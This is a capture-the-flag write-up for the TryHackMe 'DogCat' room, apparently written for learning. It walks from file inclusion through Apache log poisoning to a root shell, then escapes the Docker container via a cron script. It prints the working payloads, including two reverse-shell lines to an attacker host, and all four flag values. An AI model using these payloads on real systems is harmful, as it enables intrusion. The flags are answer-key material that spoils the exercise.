# 🐕🐱 DogCat — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Web%20|%20LFI%20|%20RCE%20|%20Docker%20Escape-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [DogCat](https://tryhackme.com/room/dogcat)

---

## 📋 Executive Summary

This writeup documents the complete compromise of the **DogCat** machine, demonstrating a multi-stage attack chain from Local File Inclusion (LFI) to Remote Code Execution (RCE) via Apache log poisoning, followed by privilege escalation inside a Docker container, and culminating in container escape through cronjob abuse. The engagement covers four flags distributed across the attack path.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance |
| `Burp Suite` | HTTP interception and manipulation |
| `nc` | Reverse shell listener |
| `curl` | HTTP request testing |
| `sudo` | Privilege escalation enumeration |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

### Findings

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | open | HTTP | Apache httpd 2.4.38 (Debian) |

**Key Observations:**
- SSH available but no credentials
- Web application is the primary attack surface

### Web Application Analysis

**Application:** PHP-based image gallery for dogs and cats.

**URL Parameters:**
- `/?view=dog` — Displays random dog image
- `/?view=cat` — Displays random cat image

**Backend Code Analysis (via PHP Filter):**

```bash
http://<TARGET_IP>/?view=php://filter/convert.base64-encode/resource=dog
```

**Decoded `index.php`:**
```php
<?php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
?>
```

**Vulnerability Identification:**
- `include $_GET['view'] . $ext` — Dynamic file inclusion
- Input validation only checks for substring "dog" or "cat"
- `$ext` parameter controls file extension (defaults to `.php`)

---

## 🌐 Phase 2: Local File Inclusion (LFI)

### Extension Bypass

The application appends `.php` by default. Bypass using `&ext=`:

```bash
http://<TARGET_IP>/?view=dog/../../../../../../../etc/passwd&ext=
```

**Result:** `/etc/passwd` successfully read.

### PHP Filter Wrapper

Read PHP source code via base64 encoding:

```bash
http://<TARGET_IP>/?view=php://filter/convert.base64-encode/resource=dog
```

**Decoded `dog.php`:**
```php
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

---

## 🐚 Phase 3: LFI to RCE (Apache Log Poisoning)

### Log File Discovery

```bash
http://<TARGET_IP>/?view=dog/../../../../../../../var/log/apache2/access.log&ext=
```

**Confirmed:** Apache access logs readable via LFI.

### Log Poisoning via User-Agent

**Step 1:** Capture request in Burp Suite and modify User-Agent:

```http
GET /?view=dog HTTP/1.1
Host: <TARGET_IP>
User-Agent: <?php passthru($_GET['cmd']); ?>
```

**Step 2:** Execute command via poisoned log:

```bash
http://<TARGET_IP>/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

**Result:** `www-data`

### Reverse Shell

**Listener:**
```bash
nc -lvnp 4444
```

**Payload (URL-encoded):**
```bash
http://<TARGET_IP>/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22<ATTACKER_IP>%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

**Result:** Shell obtained as `www-data`.

---

## 🏴 Phase 4: Flag Collection (Container)

### Flag 1

```bash
find / -name "flag*" -type f 2>/dev/null
cat /var/www/html/flag.php
```

**Flag 1:** `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`

### Flag 2

```bash
find / -name "flag2*" -type f 2>/dev/null
cat /var/www/flag2_QMW7JvaY2LvK.txt
```

**Flag 2:** `THM{LF1_t0_RC3_aec3fb}`

---

## 🚀 Phase 5: Privilege Escalation (Container Root)

```bash
sudo -l
```

**Finding:**
```
User www-data may run the following commands on <container>:
    (root) NOPASSWD: /usr/bin/env
```

### GTFOBins Exploitation

```bash
sudo /usr/bin/env /bin/sh
```

**Result:** Root shell inside Docker container.

### Flag 3

```bash
cat /root/flag3.txt
```

**Flag 3:** `THM{D1ff3r3nt_3nv1ronments_874112}`

---

## 🐳 Phase 6: Docker Escape

### Container Detection

```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
```

**Confirmed:** Running inside Docker container.

### Host Interaction Discovery

```bash
ls -la /opt/
cat /opt/backup.sh
```

**Content:**
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

**Analysis:**
- Script runs as root on host
- Backs up container filesystem
- Likely executed via cronjob on host

### Cronjob Abuse Exploitation

**Step 1:** Inject reverse shell into backup script:

```bash
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1' >> /opt/backup.sh
```

**Step 2:** Start listener on attacker machine:

```bash
nc -lvnp 5555
```

**Step 3:** Wait for cronjob execution.

**Result:** Reverse shell from host as `root`.

---

## 🏁 Phase 7: Flag 4 (Host)

```bash
cat /root/flag4.txt
```

**Flag 4:** `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`

---

## 🗺️ Attack Path Visualization

```
[Attacker]
    │
    ├───nmap───► [Target: 22, 80]
    │                │
    │                ▼
    │        [Web App: /?view=dog|cat]
    │                │
    │                ▼
    │        [LFI via &ext= bypass]
    │                │
    │                ▼
    │        [Read /var/log/apache2/access.log]
    │                │
    │                ▼
    │        [Log Poisoning via User-Agent]
    │                │
    │                ▼
    │        [RCE: www-data shell]
    │                │
    │                ▼
    │        [Flag 1: /var/www/html/flag.php]
    │                │
    │                ▼
    │        [Flag 2: /var/www/flag2_QMW7JvaY2LvK.txt]
    │                │
    │                ▼
    │        [sudo -l: env NOPASSWD]
    │                │
    │                ▼
    │        [GTFOBins: env → root]
    │                │
    │                ▼
    │        [Flag 3: /root/flag3.txt (container root)]
    │                │
    │                ▼
    │        [Docker detected (.dockerenv)]
    │                │
    │                ▼
    │        [/opt/backup.sh cronjob]
    │                │
    │                ▼
    │        [Inject reverse shell]
    │                │
    │                ▼
    │        [Host reverse shell (root)]
    │                │
    │                ▼
    └────────► [Flag 4: /root/flag4.txt]
```

---

## 🛡️ Vulnerability Assessment & Remediation

| # | Vulnerability | Severity | CVSS | Remediation |
|---|--------------|----------|------|-------------|
| 1 | **Local File Inclusion (LFI)** | 🔴 Critical | 9.8 | Sanitize user input; use allowlists for file paths; disable `include()` with user-controlled input |
| 2 | **Apache Log Poisoning** | 🔴 Critical | 9.0 | Sanitize log entries; disable PHP execution in log directories; use proper input validation |
| 3 | **Sudo Misconfiguration (env)** | 🔴 Critical | 9.0 | Remove NOPASSWD entries; restrict sudo to specific commands; use absolute paths |
| 4 | **Docker Container Escape** | 🔴 Critical | 9.8 | Run containers with least privilege; restrict host filesystem access; monitor cronjobs |
| 5 | **Writable Backup Scripts** | 🟠 High | 7.5 | Implement file integrity monitoring; restrict write permissions; use immutable backups |

---

## 🎓 Key Takeaways

1. **LFI to RCE:** Log poisoning is a reliable technique when direct code execution is not available
2. **PHP Filters:** `php://filter` allows reading source code without execution — essential for reconnaissance
3. **Input Validation Bypass:** Substring matching (`strpos`) is weak — "dog" in path bypasses checks
4. **Docker Awareness:** Always check for containerization — `.dockerenv`, `/proc/1/cgroup`
5. **Cronjob Abuse:** Host-scheduled scripts interacting with containers are escape vectors
6. **GTFOBins:** `env` with sudo is a well-known privilege escalation path

---

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| **Flag 1** | `/var/www/html/flag.php` | `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}` |
| **Flag 2** | `/var/www/flag2_QMW7JvaY2LvK.txt` | `THM{LF1_t0_RC3_aec3fb}` |
| **Flag 3** | `/root/flag3.txt` | `THM{D1ff3r3nt_3nv1ronments_874112}` |
| **Flag 4** | `/root/flag4.txt` | `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}` |

---

> **⚠️ Legal Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

---
**Author:** Miraç Akkuş (LatenT)  
**Date:** May 2026
```
